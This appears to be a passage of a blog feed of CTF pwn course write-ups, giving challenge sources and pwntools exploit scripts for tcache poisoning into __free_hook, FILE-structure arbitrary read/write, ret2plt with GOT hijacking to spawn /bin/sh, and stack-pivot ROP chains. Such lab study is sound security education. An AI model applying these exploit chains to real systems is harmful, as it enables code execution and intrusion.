#include &lt;stdio.h> #include &lt;string.h> #include &lt;stdlib.h> #include &lt;unistd.h> #include &lt;fcntl.h> #include &lt;time.h> int main() { setvbuf(stdin, 0, _IONBF, 0); setvbuf(stdout, 0, _IONBF, 0); srand(time(NULL)); void *tcache_chk[7] = {0}; unsigned char tcachebin[3][7] = {0}; // 0x20, 0x30, 0x40 unsigned int tcachebin_counts[4] = {0}; unsigned long tcache_size[7] = {0}; unsigned long tcache_free_order[7] = {0}; puts("----------- ** tcache chall ** -----------"); unsigned long tmp = 0; for (int i = 0; i &lt; 7; i++) { tmp = (rand() % 0x21) + 0x10; // 0x10 ~ 0x30 tcache_size[i] = tmp; } for (int i = 0; i &lt; 7; i++) { repeat: tmp = rand() % 7; for (int j = 0; j &lt; i; j++) if (tmp == tcache_free_order[j]) goto repeat; tcache_free_order[i] = tmp; } for (int i = 0; i &lt; 7; i++) { tcache_chk[i] = malloc( tcache_size[i] ); printf("char *%c = (char *) malloc(0x%lx);\n", 'A' + i, tcache_size[i]); } for (int i = 0; i &lt; 7; i++) { int idx = tcache_free_order[i]; free(tcache_chk[ idx ]); printf("free(%c);\n", 'A' + (unsigned char) idx); tmp = tcache_size[ idx ] - 0x8; if (tmp % 0x10) tmp = (tmp &amp; ~0xf) + 0x20; else tmp += 0x10; unsigned int binidx = ((tmp - 0x20) / 0x10); unsigned int bincnt = tcachebin_counts[ binidx ]; tcachebin[ binidx ][ bincnt ] = 'A' + (unsigned char) idx; tcachebin_counts[ binidx ]++; } char tmpbuf[0x100] = {0}; char ansbuf[3][0x100] = {0}; for (int i = 0; i &lt; 3; i++) { for (int j = 6; j >= 0; j--) if (tcachebin[i][j]) { sprintf(tmpbuf, "%c --> ", tcachebin[i][j]); strcat(ansbuf[i], tmpbuf); } strcat(ansbuf[i], "NULL"); } puts(""); for (int i = 0; i &lt; 3; i++) { printf("[chunk size] 0x%x: ", (i+2) * 0x10); if (i == 0) { printf("%s\t(just send \"%s\")\n", ansbuf[i], ansbuf[i]); } else { printf("?\n> "); fgets(tmpbuf, 0x100, stdin); if (!strncmp(tmpbuf, ansbuf[i], strlen(ansbuf[i]))) { puts("Correct !"); } else { puts("Wrong !"); printf("Ans: \"%s\"\n", ansbuf[i]); exit(0); } } } puts("\n----------- ** address chall ** -----------"); int cmp1 = 0; int cmp2 = 0; unsigned long ans_addr = 0; cmp1 = rand() % 7; while ((cmp2 = rand() % 7) == cmp1); if (cmp1 > cmp2) { tmp = cmp1; cmp1 = cmp2; cmp2 = tmp; } printf("assert( %c == %p );\n", 'A' + cmp1, tcache_chk[ cmp1 ]); printf("%c == ?\t(send as hex format, e.g. \"%p\")\n> ", 'A' + cmp2, tcache_chk[ cmp1 ]); scanf("%s", tmpbuf); ans_addr = strtoul(tmpbuf, NULL, 16); if (ans_addr == (unsigned long) tcache_chk[ cmp2 ]) { puts("Correct !"); } else { puts("Wrong !"); printf("Ans: %p\n", tcache_chk[ cmp2 ]); exit(0); } puts("\n----------- ** index chall ** -----------"); unsigned long *fastbin[2] = {0}; unsigned long fastbin_size = 0; unsigned long secret_idx = 0, result_idx = 0, res = 0; fastbin_size = (rand() % 0x31) + 0x40; // 0x40 ~ 0x70 fastbin_size &amp;= ~0xf; fastbin[0] = (unsigned long *) malloc( fastbin_size ); fastbin[1] = (unsigned long *) malloc( fastbin_size ); printf("unsigned long *%c = (unsigned long *) malloc(0x%lx);\n", 'X', fastbin_size); printf("unsigned long *%c = (unsigned long *) malloc(0x%lx);\n", 'Y', fastbin_size); secret_idx = rand() % (fastbin_size / 8); fastbin[1][ secret_idx ] = 0xdeadbeef; result_idx = ((unsigned long)(&amp;fastbin[1][ secret_idx ]) - (unsigned long)(&amp;fastbin[0][0])) / 8; printf("Y[%lu] = 0xdeadbeef;\n", secret_idx); printf("X[?] == 0xdeadbeef\t(just send an integer, e.g. \"8\")\n> "); scanf("%lu", &amp;res); if (fastbin[0][res] == 0xdeadbeef) { puts("Correct !"); } else { puts("Wrong !"); printf("Ans: %lu\n", result_idx); exit(0); } puts("\n----------- ** tcache fd chall ** -----------"); free(fastbin[0]); free(fastbin[1]); printf("free(X);\nfree(Y);\nassert( Y == %p );\n", fastbin[1]); printf("fd of Y == ?\t(send as hex format, e.g. \"%p\")\n> ", fastbin[1]); scanf("%s", tmpbuf); ans_addr = strtoul(tmpbuf, NULL, 16); if (ans_addr == *fastbin[1]) { puts("Correct !"); } else { puts("Wrong !"); printf("Ans: 0x%lx\n", *fastbin[1]); exit(0); } puts("\n----------- ** fastbin fd chall (final) ** -----------"); puts("[*] Restore the chunk to X and Y"); printf("%c = (unsigned long *) malloc(0x%lx);\n", 'Y', fastbin_size); printf("%c = (unsigned long *) malloc(0x%lx);\n", 'X', fastbin_size); fastbin[1] = malloc(fastbin_size); fastbin[0] = malloc(fastbin_size); printf("[*] Do something to fill up 0x%lx tcache\n...\n[*] finish\n", fastbin_size + 0x10); void *tmpchk[7]; for (int i = 0; i &lt; 7; i++) tmpchk[i] = malloc(fastbin_size); for (int i = 0; i &lt; 7; i++) free(tmpchk[i]); printf("free(X);\nfree(Y);\nassert( Y == %p );\n", fastbin[1]); free(fastbin[0]); free(fastbin[1]); printf("fd of Y == ?\t(send as hex format, e.g. \"%p\")\n> ", fastbin[1]); scanf("%s", tmpbuf); ans_addr = strtoul(tmpbuf, NULL, 16); if (ans_addr == *fastbin[1]) { puts("Correct !"); memset(tmpbuf, 0, 0x31); int fd = open("/home/heapmath/flag", O_RDONLY); read(fd, tmpbuf, 0x30); close(fd); printf("Here is your flag: %s\n", tmpbuf); } else { puts("Wrong !"); printf("Ans: 0x%lx\n", *fastbin[1]); exit(0); } } :::</description></item><item><title>Simple PWN 0x16(simple_smallbin)</title><link>https://bernie6401.github.io/security/course/ntu-cs/pwn/simple-pwn-0x16simple_smallbin/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntu-cs/pwn/simple-pwn-0x16simple_smallbin/index.html</guid><description>Simple PWN 0x16(simple_smallbin) tags: CTF PWN eductf Version: Ubuntu 20.04
Background Original Code :::spoiler code
#include &lt;stdio.h> #include &lt;stdlib.h> int main() { void *ptrs[7]; void *smallbin; int i; for (i = 0; i &lt; 7; i++) ptrs[i] = malloc(0x108); // 0x110 chunk size smallbin = malloc(0x108); malloc(0x18); // aim to fill up tcache while(i) free(ptrs[--i]); free(smallbin); // trigger unsorted bin dispatch malloc(0x870); return 0; } :::</description></item><item><title>Simple PWN 0x17(UAF - leak information)</title><link>https://bernie6401.github.io/security/course/ntu-cs/pwn/simple-pwn-0x17uaf---leak-information/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntu-cs/pwn/simple-pwn-0x17uaf---leak-information/index.html</guid><description>Simple PWN 0x17(UAF - leak information) tags: CTF PWN eductf Version: Ubuntu 20.04
UAF backgroud SS111-Pwn2 Advanced Binary Exploitation (Pwn) - Heap Exploitation Original Code #include &lt;stdio.h> #include &lt;stdlib.h> int main() { void *p1, *p2; p1 = malloc(0x30); p2 = malloc(0x30); free(p1); free(p2); puts(p2); } If we set the pointer to NULL after it was freed, then we can get some vital info. from this chunk.</description></item><item><title>Simple PWN 0x18(Lab - `babynote`)</title><link>https://bernie6401.github.io/security/course/ntu-cs/pwn/simple-pwn-0x18lab---babynote/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntu-cs/pwn/simple-pwn-0x18lab---babynote/index.html</guid><description>Simple PWN 0x18(Lab - babynote) tags: CTF PWN eductf Version: Ubuntu 20.04
Background hook - SS111-Pwn2 Hook簡介 Hook Function (攔截函式) The process of free and priority Assume we malloc a memory with size over 0x410, then when we free it, it’ll be classified to Unsorted bin instead of tcache Original Code :::spoiler code</description></item><item><title>Simple PWN 0x19(Lab - `babyums` - flag 1)</title><link>https://bernie6401.github.io/security/course/ntu-cs/pwn/simple-pwn-0x19lab---babyums---flag-1/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntu-cs/pwn/simple-pwn-0x19lab---babyums---flag-1/index.html</guid><description>Simple PWN 0x19(Lab - babyums - flag 1) tags: CTF PWN eductf Version: Ubuntu 20.04
Original Code :::spoiler Original Code
#include &lt;stdio.h> #include &lt;stdlib.h> #include &lt;string.h> #include &lt;unistd.h> #define FLAG1 "flag{XXXXXXXX}" struct User { char name[0x10]; char password[0x10]; void *data; }; struct User *users[8]; static short int get_idx() { short int idx; printf("index\n> "); scanf("%hu", &amp;idx); if (idx >= 8) printf("no, no ..."), exit(1); return idx; } static short int get_size() { short int size; printf("size\n> "); scanf("%hu", &amp;size); if (size >= 0x500) printf("no, no ..."), exit(1); return size; } void add_user() { short int idx; idx = get_idx(); users[idx] = malloc(sizeof(*users[idx])); printf("username\n> "); read(0, users[idx]->name, 0x10); printf("password\n> "); read(0, users[idx]->password, 0x10); users[idx]->data = NULL; printf("success!\n"); } void edit_data() { short int idx; short int size; idx = get_idx(); size = get_size(); if (users[idx]->data == NULL) users[idx]->data = malloc(size); read(0, users[idx]->data, size); printf("success!\n"); } void del_user() { short int idx; idx = get_idx(); free(users[idx]->data); free(users[idx]); printf("success!\n"); } void show_users() { for (int i = 0; i &lt; 8; i++) { if (users[i] == NULL || users[i]->data == NULL) continue; printf("[%d] %s\ndata: %s\n", i, users[i]->name, (char *)users[i]->data); } } void add_admin() { users[0] = malloc(sizeof(*users[0])); strcpy(users[0]->name, "admin"); strcpy(users[0]->password, FLAG1); users[0]->data = NULL; } int main() { char opt[2]; int power = 20; setvbuf(stdin, NULL, _IONBF, 0); setvbuf(stdout, NULL, _IONBF, 0); printf("**** User Management System ****\n"); add_admin(); while (power) { power--; printf("1. add_user\n" "2. edit_data\n" "3. del_user\n" "4. show_users\n" "5. bye\n" "> "); read(0, opt, 2); switch (opt[0]) { case '1': add_user(); break; case '2': edit_data(); break; case '3': del_user(); break; case '4': show_users(); break; case '5': exit(0); } } printf("No... no power..., b..ye...\n"); return 0; } :::</description></item><item><title>Simple PWN 0x20(Lab - `babyums` - flag 2)</title><link>https://bernie6401.github.io/security/course/ntu-cs/pwn/simple-pwn-0x20lab---babyums---flag-2/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntu-cs/pwn/simple-pwn-0x20lab---babyums---flag-2/index.html</guid><description>Simple PWN 0x20(Lab - babyums - flag 2) tags: CTF PWN eductf Version: Ubuntu 20.04
Original Code Simple PWN 0x19(Lab - babyums - flag 1)
Exploit Very similar in this article: 0x18(Lab - babynote) :::spoiler code
from pwn import * # r = process('./chal') r = remote('edu-ctf.zoolab.org', 10008) context.arch = 'amd64' def add_user(idx, user_name, user_passwd): r.sendafter(b'> ', b'1') r.sendlineafter(b'index\n> ', str(idx)) r.sendafter(b'username\n> ', user_name) r.sendafter(b'password\n> ', user_passwd) def edit_data(idx, note_size, message): r.sendafter(b"> ", b"2") r.sendlineafter(b'index\n> ', str(idx)) r.sendlineafter(b'size\n> ', str(note_size)) r.send(message) def del_user(idx): r.sendafter(b"> ", b"3") r.sendlineafter(b'index\n> ', str(idx)) def show_user(): r.sendafter(b"> ", b"4") '''------------------ Construct heap memory ------------------''' add_user(0, b'a'*8, b'aaaa') edit_data(0, 0x418, b'a') add_user(1, b'b'*8, b'bbbb') edit_data(1, 0x18, b'b') add_user(2, b'c'*8, b'cccc') '''------------------ Leak libc address ------------------''' del_user(0) show_user() r.recvuntil(b'data:') libc = (u64(r.recv(8)) >> 8) - 0x1ecbe0 - 0xa000000000000 info(f"libc address: {hex(libc)}") free_hook_addr = libc + 0x1eee48 info(f"__free_hook address: {hex(free_hook_addr)}") libc_sys_addr = libc + 0x52290 info(f"__libc_system address: {hex(libc_sys_addr)}") '''------------------ Construct fake chunk ------------------''' data = b'/bin/sh\x00'.ljust(0x10, b'b') fake_chunk = flat( 0, 0x31, b'cccccccc', b'cccccccc', b'cccccccc', b'cccccccc', free_hook_addr ) edit_data(1, 0x48, data + fake_chunk) edit_data(2, 0x8, p64(libc_sys_addr)) del_user(1) r.interactive() :::</description></item><item><title>Simple PWN 0x21(fopen, fread, fwrite, fclose)</title><link>https://bernie6401.github.io/security/course/ntu-cs/pwn/simple-pwn-0x21fopen-fread-fwrite-fclose/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntu-cs/pwn/simple-pwn-0x21fopen-fread-fwrite-fclose/index.html</guid><description>Simple PWN 0x21(fopen, fread, fwrite, fclose) tags: CTF PWN eductf Version: Ubuntu 20.04
Original Code :::spoiler fopen
#include &lt;fcntl.h> #include &lt;stdio.h> int main() { FILE *fp; fp = fopen("./test", "r"); fclose(fp); return 0; } :::
:::spoiler fread
#include &lt;fcntl.h> #include &lt;stdio.h> int main() { FILE *fp; char buf[0x10]; fp = fopen("./test", "r"); fread(buf, 0x1, 0x10, fp); fclose(fp); return 0; } :::
:::spoiler fwrite
#include &lt;fcntl.h> #include &lt;stdio.h> int main() { FILE *fp; char buf[0x10] = "TEST!!"; fp = fopen("./test_write", "r"); fread(buf, 0x1, 0x10, fp); fclose(fp); return 0; } :::</description></item><item><title>Simple PWN 0x22(Lab - `AAR`)</title><link>https://bernie6401.github.io/security/course/ntu-cs/pwn/simple-pwn-0x22lab---aar/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntu-cs/pwn/simple-pwn-0x22lab---aar/index.html</guid><description>Simple PWN 0x22(Lab - AAR) tags: CTF PWN eductf Version: Ubuntu 20.04
Original Code :::spoiler Original Code
#include &lt;stdio.h> #include &lt;stdlib.h> #include &lt;unistd.h> #include &lt;fcntl.h> char flag[0x10] = "FLAG{TEST}\n"; int main() { FILE *fp; char *buf; buf = malloc(0x10); fp = fopen("/tmp/meow", "w"); read(0, buf, 0x1000); fwrite(buf, 0x10, 1, fp); return 0; } :::
Exploit - heap overflow + overlap flag from pwn import * # r = process('./chal') r = remote('edu-ctf.zoolab.org', 10010) context.arch = 'amd64' flag_addr = 0x404050 raw_input() payload = flat( p64(0)*4, p64(0xfbad0800), #_flags p64(0), #_IO_read_ptr p64(flag_addr), #_IO_read_end p64(0), #_IO_read_base p64(flag_addr), #_IO_write_base p64(flag_addr+0x10), #_IO_write_ptr p64(0)*8, #_IO_write_end + _IO_buf_base + _IO_buf_end + _chain p64(0x1) #_fileno ) r.send(payload) r.interactive()</description></item><item><title>Simple PWN 0x23(Lab - `AAW`)</title><link>https://bernie6401.github.io/security/course/ntu-cs/pwn/simple-pwn-0x23lab---aaw/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntu-cs/pwn/simple-pwn-0x23lab---aaw/index.html</guid><description>Simple PWN 0x23(Lab - AAW) tags: CTF PWN eductf Version: Ubuntu 20.04
Original Code :::spoiler Original Code
#include &lt;stdio.h> #include &lt;stdlib.h> #include &lt;unistd.h> #include &lt;string.h> #include &lt;fcntl.h> char flag[0x10] = "FLAG{TEST}\n"; char owo[] = "OWO!"; int main() { FILE *fp; char *buf; buf = malloc(0x10); fp = fopen("/tmp/meow", "r"); read(0, buf, 0x1000); fread(buf, 0x10, 1, fp); if (strcmp(owo, "OWO!") != 0) write(1, flag, sizeof(flag)); return 0; } :::
Exploit from pwn import * # r = process('./chal') r = remote('edu-ctf.zoolab.org', 10009) context.arch = 'amd64' owo_addr = 0x404070 raw_input() payload = flat( p64(0)*2, 0, 0x1e1, p64(0xfbad0000), #_flags O p64(0), #_IO_read_ptr O p64(0), #_IO_read_end O p64(0), #_IO_read_base X p64(owo_addr), #_IO_write_base O p64(0), #_IO_write_ptr X p64(0), #_IO_write_end X p64(owo_addr), #_IO_buf_base O p64(owo_addr+0x20), #_IO_buf_end O p64(0)*5, #_chain X p64(0) #_fileno O ) r.send(payload) raw_input() r.sendline(p64(2)*2) r.interactive()</description></item><item><title>Simple PWN 0x31(2023 HW - Notepad - Stage - 1)</title><link>https://bernie6401.github.io/security/course/ntu-cs/pwn/simple-pwn-0x312023-hw---notepad---stage---1/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntu-cs/pwn/simple-pwn-0x312023-hw---notepad---stage---1/index.html</guid><description>Simple PWN 0x31(2023 HW - Notepad - Stage - 1) Description &amp; Hint nc 10.113.184.121 10044
You should solve the PoW to invoke a new instance. You can use the pow_solver.py script in the released zip to solve the PoW. After you solve the PoW, the service will create a new container and show >you the port. Connect it to play this challenge! The container will be destroy at 5 minutes. So you should debug your exploit in your environment.</description></item><item><title>Simple PWN 0x32(2023 HW - Notepad-Stage 2)</title><link>https://bernie6401.github.io/security/course/ntu-cs/pwn/simple-pwn-0x322023-hw---notepad-stage-2/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntu-cs/pwn/simple-pwn-0x322023-hw---notepad-stage-2/index.html</guid><description>Simple PWN 0x32(2023 HW - Notepad-Stage 2) Description &amp; Hint Try to get /flag_backend.
Hint1: The only intended vulnerability in the frontend (notepad) is the path traversal. Hint2: Try to write the shellcode into process memory by the path traversal vulnerability.
Source code 呈上題
Recon :::success Special Thanks @cs-otaku For the most of the Inspiration of the WP :::
Recap 在上一題，我們已經知道了他的前端漏洞為path traversal，換言之是不是可以做到任意讀取的功能，如下: def read_any_file(file_name): payload = b'../../../../../../' + b'/' * (89 - len(file_name)) + file_name offset = 0 res = '' while(True): ret = dealing_cmd(r, 5, payload, offset=str(offset).encode()) # print(ret, len(ret)) if ret != 'Read note failed.' and ret != "Couldn't open the file.": res += ret offset += 128 else: log.success(res) break return res ==漏洞發想== 透過@cs-otaku的WP，了解到如果可以做到任意讀取有甚麼厲害的地方呢?那我們就可以想辦法用該題提供的write_note的功能以及lseek的功能，寫入==/proc/self/mem==這個檔案，這是甚麼東西呢?可以看一下虛擬內存探究 – 第一篇:C strings &amp; /proc，要做的事情和我們的幾乎一樣，簡單說就是</description></item><item><title>Simple PWN 0x33(2023 Lab - ROP_RW)</title><link>https://bernie6401.github.io/security/course/ntu-cs/pwn/simple-pwn-0x332023-lab---rop_rw/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntu-cs/pwn/simple-pwn-0x332023-lab---rop_rw/index.html</guid><description>Simple PWN 0x33(2023 Lab - ROP_RW) Background ROP chain
Source code :::spoiler Source Code
#include &lt;stdio.h> #include &lt;string.h> #include &lt;unistd.h> #include &lt;sys/types.h> #include &lt;fcntl.h> char flag[0x10]; long secret; char empty_buf[0x30]; void check(char *input) { char pass[0x10]; char output[0x10]; for (int i = 0; i &lt; 2; ++i) { ((long *)pass)[i] = ((long *)input)[i] ^ secret; } if (strcmp(pass, "kyoumokawaii") == 0) { for (int i = 0; i &lt; 2; ++i) ((long *)output)[i] = ((long *)flag)[i] ^ ((long *)pass)[i]; } printf("flag = %s\n", output); } int main(void) { setvbuf(stdin, 0, _IONBF, 0); setvbuf(stdout, 0, _IONBF, 0); int fd = 0; char buf[0x10]; fd = open("/home/chal/flag.txt", O_RDONLY); read(fd, flag, 0x10); close(fd); fd = open("/dev/urandom", O_RDONLY); read(fd, &amp;secret, sizeof(secret)); for (int i = 0; i &lt; 2; ++i) ((long *)flag)[i] = ((long *)flag)[i] ^ secret; printf("secret = %lx\n", secret); printf("> "); gets(buf); return 0; } :::</description></item><item><title>Simple PWN 0x34 (2023 Lab - ret2plt)</title><link>https://bernie6401.github.io/security/course/ntu-cs/pwn/simple-pwn-0x34-2023-lab---ret2plt/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntu-cs/pwn/simple-pwn-0x34-2023-lab---ret2plt/index.html</guid><description>Simple PWN 0x34 (2023 Lab - ret2plt) Background Got Hijack / BoF
Source code //gcc -no-pie -fno-stack-protector -z norelro ret2plt.c -o ret2plt #include &lt;stdio.h> #include &lt;stdlib.h> int main(){ char buf[20]; setvbuf(stdout,0,2,0); printf("Try your best :"); gets(buf); puts("boom !");	} Recon checksec + file $ checksec chal [*] '/mnt/d/NTU/Second Year/Computer Security/PWN/Lab2/lab_ret2plt/share/chal' Arch: amd64-64-little RELRO: No RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) $ file chal chal: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=f7ed984819a3908eff455bfcf87716d0fb298fac, for GNU/Linux 3.2.0, not stripped 首先知道這隻binary是動態link library，所以可想而知，rop gadget一定少的可憐，所以我們不太能夠直接像上一題一樣暴力開一個shell出來，程式也沒有幫我們開，讓我們可以直接跳過去 還是有很明顯的BOF的漏洞，此時就可以嘗試類似got hijack的方式打看看 流程: 首先我們要知道libc base address才能夠利用扣掉offset的方式跳到system的地方，但是程式中並沒有能夠直接leak base address給我們的東西，因此我們可以自己想辦法leak: ==ret2plt== pop rdi ret puts got address puts plt 這三行的意思是把puts的got address，透過puts印出來給我們 -> puts(put自己的got address) 有了puts的got address之後，就可以扣掉puts在libc的offset，就可以知道base address，然後我們可以知道system的確切address # leak puts got address to calculate libc base address puts_addr = u64(r.recv(6).ljust(8, b'\x00')) libc_base = puts_addr - libc.symbols['puts'] libc.address = libc_base system_addr = libc.symbols['system'] 現在的問題有兩個，一個是我們要怎麼把==/bin/sh==送進去，因為如果直接看binary的gadget沒有/bin/sh或是/sh的string，不過我們可以直接用同樣的方法，把字串送進去 # fetch user input -> /bin/sh\x00 pop_rdi_ret bss_addr gets_plt, 此時他就會像使用者要輸入，並把我們的輸入丟到bss address 另外一個問題就是我們要怎麼呼叫==system==，因為這個binary是動態的，代表一開始沒有link到system的話就不能直接呼叫，因此我們可以利用同樣的方法達到==got hijacking== # fetch user input -> system address pop_rdi_ret puts_got gets_plt 此時我們可以輸入system的address，經過這三行後我們就成功把puts got address換成system got address 所有工具都準備好了，接下來只要呼叫puts就可以了，實際上就是呼叫system # system('/bin/sh\x00') pop_rdi_ret bss_addr puts_plt Exploit - Ret2Plt(leak base address) + Got Hijack(call system) from pwn import * r = process('./chal') # r = remote('10.113.184.121', 10053) libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') context.arch = 'amd64' pop_rdi_ret = 0x0000000000401263 puts_got = 0x403368 puts_plt = 0x401070 gets_got = 0x403378 gets_plt = 0x401090 bss_addr = 0x403f00 payload = flat( # leak puts got address to calculate libc base address pop_rdi_ret, puts_got, puts_plt, # fetch user input -> /bin/sh\x00 pop_rdi_ret, bss_addr, gets_plt, # fetch user input -> system address pop_rdi_ret, puts_got, gets_plt, # system('/bin/sh\x00') pop_rdi_ret, bss_addr, puts_plt ) raw_input() r.sendlineafter(b'Try your best :', b'a' * 0x28 + payload) print(r.recvline()) puts_addr = u64(r.recv(6).ljust(8, b'\x00')) log.info(f"puts address = {hex(puts_addr)}") libc_base = puts_addr - libc.symbols['puts'] libc.address = libc_base system_addr = libc.symbols['system'] log.info(f'system address = {hex(system_addr)}') r.sendline(b'/bin/sh\x00') raw_input() r.sendline(p64(libc.symbols['system'])) r.interactive()</description></item><item><title>Simple PWN 0x35(2023 Lab - Stack Pivot)</title><link>https://bernie6401.github.io/security/course/ntu-cs/pwn/simple-pwn-0x352023-lab---stack-pivot/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntu-cs/pwn/simple-pwn-0x352023-lab---stack-pivot/index.html</guid><description>Simple PWN 0x35(2023 Lab - Stack Pivot) Background Simple PWN - 0x09(stack pivoting) Simple PWN - 0x10(seccomp/Lab - rop2win)
Source code #include &lt;stdio.h> #include &lt;unistd.h> int main(void) { char buf[0x20]; read(0, buf, 0x80); return 0; } Recon 這一題助教是預設我們必須要使用stack pivot的技巧拿到flag，不過沒有時間設定seccomp，所以我們自己假裝只能使用read / write / open這三個syscall
checksec + file $ checksec chal [*] '/mnt/d/NTU/Second Year/Computer Security/PWN/Lab2/lab_stack_pivot/share/chal' Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000) $ file chal chal: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, BuildID[sha1]=26fa8e6daa97baf7a26596ea91af5703dd932327, for GNU/Linux 3.2.0, not stripped 首先可以看到該binary是statically link，所以直覺是利用ROP chain拿到shell，不過仔細看source code會發現BOF的長度顯然不太夠我們蓋成shell，所以需要用到stack pivot的技巧，控制RBP跳到其他的地方繼續寫 找gadget leave_ret = 0x0000000000401cfc pop_rdi_ret = 0x0000000000401832 pop_rsi_ret = 0x000000000040f01e pop_rax_ret = 0x0000000000448d27 pop_rdx_ret = 0x000000000040173f syscall_ret = 0x0000000000448280 這邊的重點是syscall ret這個gadget，其實他不是syscall完之後直接ret，而是在經過一些判斷才會進到ret，這個可以從gdb看出來 gef➤ x/10i 0x448280 0x448280 &lt;read+16>: syscall => 0x448282 &lt;read+18>: cmp rax,0xfffffffffffff000 0x448288 &lt;read+24>: ja 0x4482e0 &lt;read+112> 0x44828a &lt;read+26>: ret 會這樣的原因是我們在ROPgadget中找不到syscall ; ret的gadget，所以助教提示可以直接從read / write這種function找，這樣syscall完了之後會很快的接到ret，這樣中間的操作才不會太影響我們蓋的rop Construct ROP 首先，我們的流程是 ==main_fn → bss_open → main_fn → bss_open → main_fn → bss_write== 會這樣的原因是我們只能寫入0x60的空間而已，所以把open / read / write分開寫，而寫完且執行完後會再跳原main_fn，這樣才能讓我們再讀取下一段的ROP payload 寫入的bss_addr和main_fn address bss_addr_open = 0x4c2700 bss_addr_read = 0x4c2800 bss_addr_write = 0x4c2900 main_fn = 0x401ce1 先讓rbp跳到bss_open，然後ret到main_fn，接要放到bss_open的payload trash_payload = b'a'*0x20 r.sendline(trash_payload + p64(bss_addr_open) + p64(main_fn)) 之前的rop chain我們會把RBP一起蓋掉，但現在因為要跳到其他的地方，所以rbp的部分就跳到0x4c2700，然後ret address接main_fn 用gdb跟一下，放完的結果大概是這樣 0x00007ffc884f3670│+0x0000: "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" ← $rsp, $rsi 0x00007ffc884f3678│+0x0008: "aaaaaaaaaaaaaaaaaaaaaaaa" 0x00007ffc884f3680│+0x0010: "aaaaaaaaaaaaaaaa" 0x00007ffc884f3688│+0x0018: "aaaaaaaa" 0x00007ffc884f3690│+0x0020: 0x00000000004c2700 → &lt;transmem_list+0> add BYTE PTR [rax], al ← $rbp 0x00007ffc884f3698│+0x0028: 0x0000000000401ce1 → &lt;main+12> lea rax, [rbp-0x20] 當main_fn執行完leave(mov rsp , rbp ; pop rbp ;)的時候，rbp就會指到==0x4c2700==，當我們ret到main_fn時，就可以再次輸入payload放到0x4c2700 觀察main_fn的assembly gef➤ x/10i &amp;main 0x401cd5 &lt;main>: endbr64 0x401cd9 &lt;main+4>: push rbp 0x401cda &lt;main+5>: mov rbp,rsp 0x401cdd &lt;main+8>: sub rsp,0x20 0x401ce1 &lt;main+12>: lea rax,[rbp-0x20] 0x401ce5 &lt;main+16>: mov edx,0x80 0x401cea &lt;main+21>: mov rsi,rax 0x401ced &lt;main+24>: mov edi,0x0 0x401cf2 &lt;main+29>: call 0x448270 &lt;read> 0x401cf7 &lt;main+34>: mov eax,0x0 從以上的code可以看得出來，我們是跳到0x401ce1，所以rbp會張出0x20的空間，也就是==0x4c2700-0x20=0x4c26e0==，然後read到的內容就會放到這邊來 寫入bss_addr_open 我們的目標是達成==fd = open("/home/chal/flag.txt", 0);==，具體payload如下 file_addr = b'/home/chal/flag.txt'.ljust(0x20, b'\x00') ROP_open = flat( # Open file # fd = open("/home/chal/flag.txt", 0); bss_addr_read, pop_rax_ret, 2, pop_rdi_ret, bss_addr_open - 0x20, pop_rsi_ret, 0, pop_rdx_ret, 0, syscall_ret, main_fn ) r.sendline(file_addr + ROP_open) 首先原本的0x20就拿來放檔案的位址，不過為甚麼後面還要再接著bss_addr_write呢?就和上面一樣，我們要寫別的rop payload上去，因為原本的位子不夠寫了，所以syscall_ret後接到main_fn，他會讀取我們寫入的rop payload到bss_addr_read的地方 寫入bss_addr_read 我們要達成的目標是==read(fd, buf, 0x30)==，具體payload如下 ROP_read = flat( # Read the file # read(fd, buf, 0x30); bss_addr_write, pop_rax_ret, 0, pop_rdi_ret, 3, pop_rsi_ret, bss_addr_read, pop_rdx_ret, 0x30, syscall_ret, main_fn ) r.sendline(file_addr + ROP_read) 寫入bss_addr_write 我們要達成的目標是==write(fd, buf, 0x30)==，具體payload如下 ROP_write = flat( # Write the file # write(1, buf, 0x30); bss_addr_write, pop_rax_ret, 1, pop_rdi_ret, 1, pop_rsi_ret, bss_addr_read, pop_rdx_ret, 0x30, syscall_ret, 0 ) r.sendline(file_addr + ROP_write) :::danger 執行的時候如果遇到local端可以run但server爛掉的情況，有可能是raw_input()造成的，可以先註解掉這些東西，如果還是遇到一樣的問題，可以開docker在裡面執行</description></item><item><title>Simple PWN 0x36(2023 HW - Notepad-Stage 3)</title><link>https://bernie6401.github.io/security/course/ntu-cs/pwn/simple-pwn-0x362023-hw---notepad-stage-3/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntu-cs/pwn/simple-pwn-0x362023-hw---notepad-stage-3/index.html</guid><description>Simple PWN 0x36(2023 